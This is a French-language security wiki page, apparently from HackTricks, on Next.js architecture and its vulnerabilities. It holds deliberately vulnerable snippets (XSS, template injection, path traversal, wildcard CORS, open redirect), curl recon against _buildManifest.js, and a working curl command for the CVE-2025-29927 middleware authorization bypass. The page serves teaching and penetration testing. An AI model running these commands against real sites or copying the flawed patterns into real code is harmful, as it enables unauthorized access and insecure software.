# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Architecture générale d'une application Next.js

### Structure de fichiers typique

Un projet Next.js standard suit une structure de fichiers et de répertoires spécifique qui facilite ses fonctionnalités comme le routage, les endpoints d'API et la gestion des ressources statiques. Voici une disposition typique:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Principaux répertoires et fichiers

- **public/:** Héberge les assets statiques tels que images, polices et autres fichiers. Les fichiers présents ici sont accessibles à la racine (`/`).
- **app/:** Répertoire central pour les pages, layouts, composants et routes API de votre application. Adopte le paradigme **App Router**, permettant des fonctionnalités de routage avancées et la séparation des composants serveur-client.
- **app/layout.tsx:** Définit le layout racine de votre application, enveloppant toutes les pages et fournissant des éléments d'interface utilisateur cohérents comme les headers, footers et barres de navigation.
- **app/page.tsx:** Sert de point d'entrée pour la route racine `/`, rendant la page d'accueil.
- **app/[route]/page.tsx:** Gère les routes statiques et dynamiques. Chaque dossier dans `app/` représente un segment de route, et le `page.tsx` à l'intérieur de ces dossiers correspond au composant de la route.
- **app/api/:** Contient les routes API, vous permettant de créer des fonctions serverless qui traitent les requêtes HTTP. Ces routes remplacent le répertoire traditionnel `pages/api`.
- **app/components/:** Contient des composants React réutilisables pouvant être utilisés à travers différentes pages et layouts.
- **app/styles/:** Contient les fichiers CSS globaux et les CSS Modules pour le stylage scoped aux composants.
- **app/utils/:** Inclut des fonctions utilitaires, modules d'aide et autres logiques non-UI partageables à travers l'application.
- **.env.local:** Stocke les variables d'environnement spécifiques à l'environnement de développement local. Ces variables ne sont **pas** commit dans le contrôle de version.
- **next.config.js:** Personnalise le comportement de Next.js, y compris les configurations webpack, les variables d'environnement et les paramètres de sécurité.
- **tsconfig.json:** Configure les options TypeScript du projet, activant le typage et d'autres fonctionnalités TypeScript.
- **package.json:** Gère les dépendances du projet, les scripts et les métadonnées.
- **README.md:** Fournit la documentation et les informations sur le projet, incluant les instructions d'installation, les consignes d'utilisation et autres détails pertinents.
- **yarn.lock / package-lock.json:** Verrouillent les dépendances du projet à des versions spécifiques, garantissant des installations cohérentes entre différents environnements.

## Côté client dans Next.js

### Routage basé sur les fichiers dans le répertoire `app`

Le répertoire `app` est la pierre angulaire du routage dans les dernières versions de Next.js. Il exploite le système de fichiers pour définir les routes, rendant la gestion des routes intuitive et scalable.

<details>

<summary>Gestion du chemin racine /</summary>

**Structure des fichiers :**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Fichiers clés :**

- **`app/page.tsx`**: Gère les requêtes vers le chemin racine `/`.
- **`app/layout.tsx`**: Définit la mise en page de l'application, englobant toutes les pages.

**Implémentation :**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Explication :**

- **Définition de la route :** Le fichier `page.tsx` situé directement sous le répertoire `app` correspond à la route `/`.
- **Rendu :** Ce composant affiche le contenu de la page d'accueil.
- **Intégration du layout :** Le composant `HomePage` est enveloppé par `layout.tsx`, qui peut inclure des en-têtes, des pieds de page et d'autres éléments communs.

</details>

<details>

<summary>Gestion des autres chemins statiques</summary>

**Exemple : route `/about`**

**Structure des fichiers :**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implémentation:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Explication :**

- **Définition de la route :** Le fichier `page.tsx` à l'intérieur du dossier `about` correspond à la route `/about`.
- **Rendu :** Ce composant affiche le contenu de la page `/about`.

</details>

<details>

<summary>Routes dynamiques</summary>

Les routes dynamiques permettent de gérer des chemins avec des segments variables, permettant aux applications d'afficher du contenu en fonction de paramètres tels que des IDs, des slugs, etc.

**Exemple : la route `/posts/[id]`**

**Structure des fichiers :**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implémentation :**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Explication :**

- **Segment dynamique :** `[id]` désigne un segment dynamique dans la route, capturant le paramètre `id` depuis l'URL.
- **Accès aux paramètres :** L'objet `params` contient les paramètres dynamiques, accessibles depuis le composant.
- **Correspondance de route :** Tout chemin correspondant à `/posts/*`, tel que `/posts/1`, `/posts/abc`, etc., sera géré par ce composant.

</details>

<details>

<summary>Routes imbriquées</summary>

Next.js prend en charge le routage imbriqué, permettant des structures de routes hiérarchiques qui reflètent la disposition du répertoire.

**Exemple : route `/dashboard/settings/profile`**

**Structure de fichiers :**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implémentation:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Explication :**

- **Imbrication profonde :** Le fichier `page.tsx` situé dans `dashboard/settings/profile/` correspond à la route `/dashboard/settings/profile`.
- **Reflet de la hiérarchie :** La structure des répertoires reflète le chemin de l'URL, améliorant la maintenabilité et la clarté.

</details>

<details>

<summary>Routes catch-all</summary>

Les routes catch-all gèrent plusieurs segments imbriqués ou des chemins inconnus, offrant de la flexibilité dans le traitement des routes.

**Exemple : la route `/*`**

**Structure des fichiers :**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implémentation :**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Explication :**

- **Segment catch-all :** `[...slug]` capture tous les segments de chemin restants sous forme de tableau.
- **Utilisation :** Utile pour gérer des scénarios de routage dynamique tels que des chemins générés par les utilisateurs, des catégories imbriquées, etc.
- **Correspondance des routes :** Des chemins comme `/anything/here`, `/foo/bar/baz`, etc., sont gérés par ce composant.

</details>

### Vulnérabilités potentielles côté client

Bien que Next.js fournisse une base sécurisée, des pratiques de codage inappropriées peuvent introduire des vulnérabilités. Les principales vulnérabilités côté client incluent :

<details>

<summary>Cross-Site Scripting (XSS)</summary>

Les attaques XSS se produisent lorsque des scripts malveillants sont injectés dans des sites de confiance. Les attaquants peuvent exécuter des scripts dans les navigateurs des utilisateurs, voler des données ou effectuer des actions au nom de l'utilisateur.

**Exemple de code vulnérable :**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Pourquoi c'est vulnérable :** L'utilisation de `dangerouslySetInnerHTML` avec des entrées non fiables permet aux attaquants d'injecter des scripts malveillants.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Se produit lorsque les saisies utilisateur sont mal traitées dans les templates, ce qui permet aux attaquants d'injecter et d'exécuter des templates ou des expressions.

**Exemple de code vulnérable :**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Pourquoi c'est vulnérable :** Si `template` ou `data` contient du contenu malveillant, cela peut entraîner l'exécution de code non prévu.

</details>

<details>

<summary>Client Path Traversal</summary>

C'est une vulnérabilité qui permet aux attaquants de manipuler les chemins côté client pour effectuer des actions non intentionnelles, telles que Cross-Site Request Forgery (CSRF). Contrairement au server-side path traversal, qui cible le système de fichiers du serveur, le CSPT se concentre sur l'exploitation des mécanismes côté client pour rediriger des requêtes API légitimes vers des endpoints malveillants.

**Exemple de code vulnérable :**

Une application Next.js permet aux utilisateurs de téléverser et de télécharger des fichiers. La fonctionnalité de téléchargement est implémentée côté client, où les utilisateurs peuvent spécifier le chemin du fichier à télécharger.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Scénario d'attaque

1. **Attacker's Objective**: Réaliser une attaque CSRF pour supprimer un fichier critique (par ex., `admin/config.json`) en manipulant le `filePath`.
2. **Exploiting CSPT**:
- **Malicious Input**: L'attaquant construit une URL avec un `filePath` manipulé, par exemple `../deleteFile/config.json`.
- **Resulting API Call**: Le code côté client envoie une requête vers `/api/files/../deleteFile/config.json`.
- **Server's Handling**: Si le serveur ne valide pas le `filePath`, il traite la requête, ce qui peut entraîner la suppression ou l'exposition de fichiers sensibles.
3. **Executing CSRF**:
- **Crafted Link**: L'attaquant envoie à la victime un lien ou insère un script malveillant qui déclenche la requête de téléchargement avec le `filePath` manipulé.
- **Outcome**: La victime exécute l'action à son insu, entraînant un accès ou une suppression non autorisée de fichiers.

</details>

### Recon: découverte des routes d'export statique via _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Utilisez les chemins découverts (par exemple `/docs`, `/docs/content/examples`, `/signin`) pour orienter les tests d'auth et la découverte d'endpoints.

## Côté serveur dans Next.js

### Rendu côté serveur (SSR)

Les pages sont rendues sur le serveur à chaque requête, garantissant que l'utilisateur reçoit du HTML entièrement rendu. Dans ce cas, vous devriez créer votre propre serveur personnalisé pour traiter les requêtes.

**Cas d'utilisation :**

- Contenu dynamique qui change fréquemment.
- Optimisation SEO, car les moteurs de recherche peuvent parcourir la page entièrement rendue.

**Implémentation :**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Génération de site statique (SSG)

Les pages sont pré-rendues lors de la compilation, ce qui entraîne des temps de chargement plus rapides et une réduction de la charge du serveur.

**Cas d'utilisation :**

- Contenu qui ne change pas fréquemment.
- Blogs, documentation, pages marketing.

**Implémentation :**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Fonctions serverless (API Routes)

Next.js permet la création d'endpoints API sous forme de fonctions serverless. Ces fonctions s'exécutent à la demande sans nécessiter de serveur dédié.

**Cas d'utilisation :**

- Traitement des soumissions de formulaires.
- Interaction avec des bases de données.
- Traitement de données ou intégration avec des API tierces.

**Implémentation :**

Avec l'introduction du répertoire `app` dans Next.js 13, le routage et la gestion des API sont devenus plus flexibles et puissants. Cette approche moderne s'aligne étroitement sur le système de routage basé sur les fichiers mais introduit des capacités étendues, incluant le support des composants serveur et client.

#### Gestionnaire de route basique

**Structure des fichiers :**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implémentation :**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Explication :**

- **Location :** Les routes API sont placées sous le répertoire `app/api/`.
- **File Naming :** Chaque endpoint API réside dans son propre dossier contenant un fichier `route.js` ou `route.ts`.
- **Exported Functions :** Au lieu d'une exportation par défaut unique, des fonctions spécifiques aux méthodes HTTP (par ex., `GET`, `POST`) sont exportées.
- **Response Handling :** Utilisez le constructeur `Response` pour renvoyer des réponses, ce qui permet un meilleur contrôle des en-têtes et des codes d'état.

#### Comment gérer d'autres chemins et méthodes :

<details>

<summary>Handling Specific HTTP Methods</summary>

Next.js 13+ vous permet de définir des gestionnaires pour des méthodes HTTP spécifiques dans le même fichier `route.js` ou `route.ts`, ce qui favorise un code plus clair et mieux organisé.

**Exemple :**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Explication :**

- **Multiple Exports:** Each HTTP method (`GET`, `PUT`, `DELETE`) has its own exported function.
- **Paramètres :** Le deuxième argument fournit l'accès aux paramètres de route via `params`.
- **Réponses améliorées :** Un contrôle plus fin des objets de réponse, permettant une gestion précise des en-têtes et des codes de statut.

</details>

<details>

<summary>Routes catch-all et imbriquées</summary>

Next.js 13+ prend en charge des fonctionnalités de routage avancées comme les routes catch-all et les routes API imbriquées, permettant des architectures d'API plus dynamiques et évolutives.

**Exemple de route catch-all :**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Explication :**

- **Syntax :** `[...]` désigne un segment catch-all, capturant tous les chemins imbriqués.
- **Usage :** Utile pour les APIs qui doivent gérer des profondeurs de route variables ou des segments dynamiques.

**Exemple de routes imbriquées :**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Explication :**

- **Imbrication profonde :** Permet des structures API hiérarchiques, reflétant les relations entre les ressources.
- **Accès aux paramètres :** Permet d'accéder facilement à plusieurs paramètres de route via l'objet `params`.

</details>

<details>

<summary>Gestion des routes API dans Next.js 12 et versions antérieures</summary>

## Routes API dans le répertoire `pages` (Next.js 12 et versions antérieures)

Avant que Next.js 13 n'introduise le répertoire `app` et n'améliore les capacités de routage, les routes API étaient principalement définies dans le répertoire `pages`. Cette approche est encore largement utilisée et prise en charge dans Next.js 12 et les versions antérieures.

#### Route API basique

**Structure du fichier :**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implémentation:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Explication :**

- **Emplacement :** Les routes API se trouvent dans le répertoire `pages/api/`.
- **Export :** Utilisez `export default` pour définir la fonction handler.
- **Signature de la fonction :** Le handler reçoit les objets `req` (requête HTTP) et `res` (réponse HTTP).
- **Routage :** Le nom du fichier (`hello.js`) correspond à l'endpoint `/api/hello`.

#### Routes API dynamiques

**Structure des fichiers :**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implémentation :**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Explication :**

- **Segments dynamiques :** Les crochets (`[id].js`) désignent des segments de route dynamiques.
- **Accès aux paramètres :** Utilisez `req.query.id` pour accéder au paramètre dynamique.
- **Gestion des méthodes :** Utilisez une logique conditionnelle pour traiter les différentes méthodes HTTP (`GET`, `PUT`, `DELETE`, etc.).

#### Gestion des différentes méthodes HTTP

Alors que l'exemple de route API de base gère toutes les méthodes HTTP au sein d'une seule fonction, vous pouvez structurer votre code pour traiter chaque méthode explicitement afin d'améliorer la clarté et la maintenabilité.

**Exemple :**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Bonnes pratiques :**

- **Séparation des responsabilités :** Séparez clairement la logique pour les différentes méthodes HTTP.
- **Cohérence des réponses :** Assurez des structures de réponse cohérentes pour faciliter le traitement côté client.
- **Gestion des erreurs :** Gérez correctement les méthodes non prises en charge et les erreurs inattendues.

</details>

### Configuration CORS

Contrôlez quelles origines peuvent accéder à vos routes API, en limitant les vulnérabilités liées à Cross-Origin Resource Sharing (CORS).

**Exemple de mauvaise configuration :**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Notez que **CORS peut également être configuré dans toutes les routes API** dans le fichier **`middleware.ts`**:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problème :**

- **`Access-Control-Allow-Origin: '*'`:** Permet à n'importe quel site web d'accéder à l'API, pouvant permettre à des sites malveillants d'interagir avec votre API sans restrictions.
- **Large autorisation des méthodes :** Autoriser toutes les méthodes peut permettre à des attaquants d'effectuer des actions indésirables.

**Comment les attaquants l'exploitent :**

Les attaquants peuvent concevoir des sites web malveillants qui effectuent des requêtes vers votre API, abusant potentiellement de fonctionnalités telles que la récupération de données, la manipulation de données, ou le déclenchement d'actions indésirables au nom d'utilisateurs authentifiés.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Exposition du code serveur côté client

Il est facile d'**utiliser du code servant côté serveur également dans du code exposé et exécuté côté client**, la meilleure façon de s'assurer qu'un fichier de code n'est jamais exposé côté client est d'utiliser cet import au début du fichier :
```js
import "server-only"
```
## Fichiers clés et leurs rôles

### `middleware.ts` / `middleware.js`

**Emplacement :** Racine du projet ou dans `src/`.

**But :** Exécute du code dans la fonction serverless côté serveur avant le traitement d'une requête, permettant des tâches comme l'authentification, les redirections ou la modification des réponses.

**Flux d'exécution :**

1. **Requête entrante :** le middleware intercepte la requête.
2. **Traitement :** effectue des opérations basées sur la requête (par ex., vérification de l'authentification).
3. **Modification de la réponse :** peut modifier la réponse ou transférer le contrôle au gestionnaire suivant.

**Exemples d'utilisation :**

- Redirection des utilisateurs non authentifiés.
- Ajout d'en-têtes personnalisés.
- Journalisation des requêtes.

**Exemple de configuration :**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Si l'autorisation est appliquée dans middleware, les versions affectées de Next.js (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) peuvent être contournées en injectant l'en-tête `x-middleware-subrequest`. Le framework ignorera la récursion du middleware et renverra la page protégée.

- Le comportement par défaut est typiquement une redirection 307 vers une route de connexion comme `/api/auth/signin`.
- Envoyer une valeur longue pour `x-middleware-subrequest` (répétez `middleware` pour atteindre `MAX_RECURSION_DEPTH`) pour faire basculer la réponse à 200 :
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Parce que les pages authentifiées chargent de nombreuses sous-ressources, ajoutez l'en-tête à chaque requête (par ex., Burp Match/Replace avec une chaîne de correspondance vide) pour éviter que les ressources ne redirigent.

### `next.config.js`

**Emplacement :** Racine du projet.

**But :** Configure le comportement de Next.js, activer ou désactiver des fonctionnalités, personnaliser les configurations webpack, définir des variables d'environnement et configurer plusieurs fonctionnalités de sécurité.

**Principales configurations de sécurité :**

<details>

<summary>En-têtes de sécurité</summary>

Les en-têtes de sécurité renforcent la sécurité de votre application en indiquant aux navigateurs comment gérer le contenu. Ils aident à atténuer diverses attaques comme Cross-Site Scripting (XSS), Clickjacking, et MIME type sniffing :

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Exemples :**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Paramètres d'optimisation des images</summary>

Next.js optimise les images pour les performances, mais des mauvaises configurations peuvent entraîner des vulnérabilités de sécurité, par exemple en autorisant des sources non fiables à injecter du contenu malveillant.

**Exemple de mauvaise configuration :**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Problème :**

- **`'*'`:** Permet de charger des images depuis n'importe quelle source externe, y compris des domaines non fiables ou malveillants. Les attaquants peuvent héberger des images contenant des payloads malveillants ou du contenu trompeur.
- Un autre problème peut être d'autoriser un domaine **où n'importe qui peut upload une image** (comme `raw.githubusercontent.com`)

**Comment les attaquants en abusent :**

En injectant des images provenant de sources malveillantes, les attaquants peuvent mener des attaques de phishing, afficher des informations trompeuses, ou exploiter des vulnérabilités dans les bibliothèques de rendu d'images.

</details>

<details>

<summary>Exposition des variables d'environnement</summary>

Gérez les informations sensibles comme les API keys et les database credentials de façon sécurisée sans les exposer au client.

#### a. Exposition des variables sensibles

**Mauvais exemple de configuration :**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Problème :**

- **`SECRET_API_KEY`:** Sans le préfixe `NEXT_PUBLIC_`, Next.js n'expose pas les variables au client. Cependant, si préfixée par erreur (p. ex., `NEXT_PUBLIC_SECRET_API_KEY`), elle devient accessible côté client.

**Comment les attaquants l'exploitent :**

Si des variables sensibles sont exposées au client, les attaquants peuvent les récupérer en inspectant le code côté client ou les requêtes réseau, obtenant ainsi un accès non autorisé aux APIs, bases de données ou autres services.

</details>

<details>

<summary>Redirections</summary>

Gérez les redirections et réécritures d'URL au sein de votre application, en vous assurant que les utilisateurs sont dirigés correctement sans introduire d'open redirect vulnerabilities.

#### a. Open Redirect Vulnerability

**Exemple de mauvaise configuration :**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problem:**

- **Destination dynamique:** Permet aux utilisateurs de spécifier n'importe quelle URL, permettant des attaques open redirect.
- **Se fier aux entrées utilisateur:** Rediriger vers des URL fournies par les utilisateurs sans validation peut conduire à du phishing, à la distribution de malware, ou au credential theft.

**How attackers abuse it:**

Les attaquants peuvent concevoir des URL qui semblent provenir de votre domaine mais qui redirigent les utilisateurs vers des sites malveillants. Par exemple:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Les utilisateurs qui font confiance au domaine d’origine peuvent, sans le savoir, être dirigés vers des sites web malveillants.

</details>

<details>

<summary>Webpack Configuration</summary>

La personnalisation des configurations Webpack pour votre application Next.js peut involontairement introduire des vulnérabilités de sécurité si elle n'est pas effectuée avec prudence.

#### a. Exposition de modules sensibles

**Mauvais exemple de configuration :**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Problème :**

- **Exposing Sensitive Paths :** L'aliasing de répertoires sensibles et l'autorisation d'accès côté client peuvent leak des informations confidentielles.
- **Bundling Secrets :** Si des fichiers sensibles sont bundlés pour le client, leur contenu devient accessible via les source maps ou en inspectant le code côté client.

**Comment les attaquants en abusent :**

Les attaquants peuvent accéder à ou reconstruire la structure des répertoires de l'application, trouvant potentiellement et exploitant des fichiers ou des données sensibles.

</details>

### `pages/_app.js` et `pages/_document.js`

#### **`pages/_app.js`**

**Purpose :** Remplace le composant App par défaut, permettant d'utiliser un état global, des styles et des composants de mise en page.

**Use Cases :**

- Injection de CSS global.
- Ajout de wrappers de layout.
- Intégration de bibliothèques de gestion d'état.

**Exemple :**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Objectif :** Remplace le Document par défaut, permettant de personnaliser les balises <html> et <body>.

**Cas d'utilisation :**

- Modifier les balises `<html>` ou `<body>`.
- Ajouter des balises meta ou des scripts personnalisés.
- Intégrer des polices tierces.

**Exemple :**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Serveur personnalisé (optionnel)

**Objectif :** Bien que Next.js soit livré avec un serveur intégré, vous pouvez créer un serveur personnalisé pour des cas d'utilisation avancés comme le routage personnalisé ou l'intégration avec des services backend existants.

**Remarque :** L'utilisation d'un serveur personnalisé peut limiter les options de déploiement, en particulier sur des plateformes comme Vercel qui optimisent le serveur intégré de Next.js.

**Exemple :**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Considérations architecturales et de sécurité supplémentaires

### Variables d'environnement et configuration

**Objectif :** Gérer les informations sensibles et les paramètres de configuration en dehors du code.

**Bonnes pratiques :**

- **Utiliser les fichiers `.env` :** Stocker des variables comme les clés API dans `.env.local` (exclu du contrôle de version).
- **Accéder aux variables en toute sécurité :** Utiliser `process.env.VARIABLE_NAME` pour accéder aux variables d'environnement.
